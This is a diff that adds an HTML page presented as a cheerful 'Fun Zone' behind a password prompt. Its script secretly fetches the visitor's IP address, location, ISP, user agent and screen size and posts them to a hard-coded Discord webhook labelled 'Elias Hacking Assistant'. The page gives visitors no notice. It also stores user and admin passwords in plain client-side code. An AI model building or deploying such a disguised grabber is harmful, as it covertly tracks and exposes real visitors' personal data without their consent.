@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to the Fun Zone!</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: linear-gradient(45deg, #ff416c, #ff4b2b, #1e90ff, #2bff88);
+      background-size: 400% 400%;
+      animation: bgMove 10s infinite alternate ease-in-out;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    @keyframes bgMove {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 100% 50%; }
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+      max-width: 450px;
+      width: 100%;
+      transition: transform 0.3s;
+    }
+
+    .container:hover {
+      transform: scale(1.05);
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+      color: #333;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      border: 3px solid white;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    .admin-section {
+      margin-top: 20px;
+      display: none;
+    }
+
+    .admin-button, .test-button {
+      background-color: #3498db;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 10px;
+    }
+
+    .admin-button:hover, .test-button:hover {
+      background-color: #2980b9;
+    }
+
+    .password-input {
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: 1px solid #ddd;
+      margin: 10px;
+    }
+
+    .password-hint {
+      font-size: 16px;
+      color: #2c3e50;
+      margin-top: 10px;
+      font-style: italic;
+    }
+
+    .ip-log {
+      margin-top: 20px;
+      padding: 10px;
+      background: #ecf0f1;
+      border-radius: 5px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+    
+    .ip-log p {
+      margin: 5px 0;
+      padding: 3px;
+      border-bottom: 1px solid #ddd;
+    }
+
+  </style>
+  <script>
+    async function fetchIPAndLocation() {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoResponse.json();
+
+        return {
+          ip: ip,
+          continent: geoData.continent_code,
+          country: geoData.country_name,
+          region: geoData.region,
+          city: geoData.city,
+          isp: geoData.org,
+        };
+      } catch (error) {
+        console.error('Error fetching IP or geolocation:', error);
+        return null;
+      }
+    }
+
+    async function sendToWebhook(data) {
+      const webhookURL = 'https://discord.com/api/webhooks/1336647287249829959/XjzqGEadFFpE_XrKqyqebZVdTiT23cBckU6-OIExi_W77GVNxxtyeVzwThHy3hRLhGCO'; // Replace with your webhook URL
+
+      // Collect browser and device information
+      const userActivity = {
+        device: navigator.userAgent,
+        screenSize: `${window.innerWidth}x${window.innerHeight}`,
+      };
+
+      // Prepare the message
+      const message = {
+        content: `New visitor detected! 🚀`,
+        username: 'Elias Hacking Assistant',
+        avatar_url: 'https://i.imgur.com/Af4innD.jpeg',
+        embeds: [
+          {
+            title: 'Visitor Details',
+            color: 0x3498db,
+            fields: [
+              { name: 'IP Address', value: data.ip, inline: true },
+              { name: 'Continent', value: data.continent, inline: true },
+              { name: 'Country', value: data.country, inline: true },
+              { name: 'Region', value: data.region, inline: true },
+              { name: 'City', value: data.city, inline: true },
+              { name: 'ISP', value: data.isp, inline: true },
+              { name: 'Device Info', value: userActivity.device, inline: false },
+              { name: 'Screen Size', value: userActivity.screenSize, inline: false },
+            ],
+          },
+        ],
+      };
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(message),
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send data to Discord:', response.statusText);
+        }
+      } catch (error) {
+        console.error('Error sending data to Discord:', error);
+      }
+    }
+
+    // Admin Login and Test Button Functionality
+    const correctPassword = 'password123'; // Normal user password
+    const adminPassword = 'admin123'; // Admin password
+
+    let isAdmin = false;
+    let ipLogs = []; // Store IP logs for the admin
+
+    function showAccessSection() {
+      const passwordInput = document.getElementById("password-input").value;
+      
+      // Check for normal user or admin password
+      if (passwordInput === correctPassword) {
+        // User access granted
+        isAdmin = false;
+        document.querySelector(".container").style.display = "block";
+        document.querySelector(".password-section").style.display = "none";
+        // Start sending IP data
+        initializeNormalAccess();
+      } else if (passwordInput === adminPassword) {
+        // Admin access granted
+        isAdmin = true;
+        document.querySelector(".container").style.display = "block";
+        document.querySelector(".password-section").style.display = "none";
+        document.querySelector(".admin-section").style.display = "block"; // Show admin panel
+      } else {
+        alert("Incorrect password! Please try again.");
+      }
+    }
+
+    async function initializeNormalAccess() {
+      const data = await fetchIPAndLocation();
+      if (data) {
+        await sendToWebhook(data);
+        if (isAdmin) {
+          ipLogs.push(data); // Store IP logs for admin view
+          updateIPLogs();
+        }
+      }
+    }
+
+    async function sendTestMessage() {
+      const fakeData = {
+        ip: "123.45.67.89",
+        continent: "North America",
+        country: "United States",
+        region: "California",
+        city: "Los Angeles",
+        isp: "Fake ISP Inc.",
+      };
+
+      await sendToWebhook(fakeData);
+      ipLogs.push(fakeData); // Store fake log
+      updateIPLogs();
+      alert("Test message sent to Discord!");
+    }
+
+    // Update the displayed IP logs in admin panel
+    function updateIPLogs() {
+      const logContainer = document.getElementById("ip-log-container");
+      logContainer.innerHTML = ''; // Clear previous logs
+
+      ipLogs.forEach(log => {
+        const logElement = document.createElement('p');
+        logElement.textContent = `IP: ${log.ip} | Country: ${log.country} | City: ${log.city}`;
+        logContainer.appendChild(logElement);
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      // Show password hint on the login screen
+      document.getElementById("password-hint").textContent = "The password is password123";
+
+      // Hide container until password is entered
+      document.querySelector(".container").style.display = "none";
+      document.querySelector(".admin-section").style.display = "none";
+    });
+  </script>
+</head>
+<body>
+  <div class="password-section" style="text-align:center;">
+    <h2>Enter Password</h2>
+    <input id="password-input" type="password" class="password-input" placeholder="Enter the password" />
+    <br />
+    <button onclick="showAccessSection()">Submit</button>
+    <p id="password-hint" class="password-hint"></p>
+  </div>
+
+  <div class="container" style="display:none;">
+    <h1 id="message">Loading...</h1>
+    <img class="avatar" src="https://api.dicebear.com/7.x/bottts/svg" alt="Avatar">
+    <p>Enjoy your time here! 🌟</p>
+    
+    <!-- Admin Panel -->
+    <div class="admin-section" style="display:none;">
+      <h2>Admin Panel</h2>
+      <button class="test-button" onclick="sendTestMessage()">Send Test Message</button>
+      <div class="ip-log" id="ip-log-container">
+        <!-- IP Logs will be displayed here -->
+      </div>
+    </div>
+  </div>
+</body>
+</html>
